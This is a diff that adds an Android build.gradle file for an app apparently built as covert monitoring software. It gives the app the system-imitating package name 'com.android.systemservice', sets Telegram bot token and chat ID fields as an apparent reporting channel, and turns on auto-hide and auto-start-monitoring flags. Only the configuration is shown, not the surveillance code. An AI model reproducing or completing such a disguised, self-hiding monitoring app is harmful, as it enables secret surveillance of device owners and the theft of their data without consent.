@@ -1,0 +1,36 @@
+# app-level build.gradle
+android {
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.android.systemservice"
+        minSdk 27
+        targetSdk 34
+        versionCode 1
+        versionName "1.0"
+
+        // Pre-configured bot credentials (replace with your actual values)
+        buildConfigField "String", "TELEGRAM_BOT_TOKEN", "\"YOUR_BOT_TOKEN_HERE\""
+        buildConfigField "String", "TELEGRAM_CHAT_ID", "\"YOUR_CHAT_ID_HERE\""
+        
+        // Auto-configuration flags
+        buildConfigField "boolean", "AUTO_CONFIGURE", "true"
+        buildConfigField "boolean", "AUTO_HIDE", "true"
+        buildConfigField "boolean", "AUTO_START_MONITORING", "true"
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+            
+            // Override for production release
+            buildConfigField "String", "TELEGRAM_BOT_TOKEN", "\"${project.findProperty("TELEGRAM_BOT_TOKEN") ?: "YOUR_BOT_TOKEN_HERE"}\""
+            buildConfigField "String", "TELEGRAM_CHAT_ID", "\"${project.findProperty("TELEGRAM_CHAT_ID") ?: "YOUR_CHAT_ID_HERE"}\""
+        }
+        debug {
+            buildConfigField "String", "TELEGRAM_BOT_TOKEN", "\"YOUR_BOT_TOKEN_HERE\""
+            buildConfigField "String", "TELEGRAM_CHAT_ID", "\"YOUR_CHAT_ID_HERE\""
+        }
+    }
+}
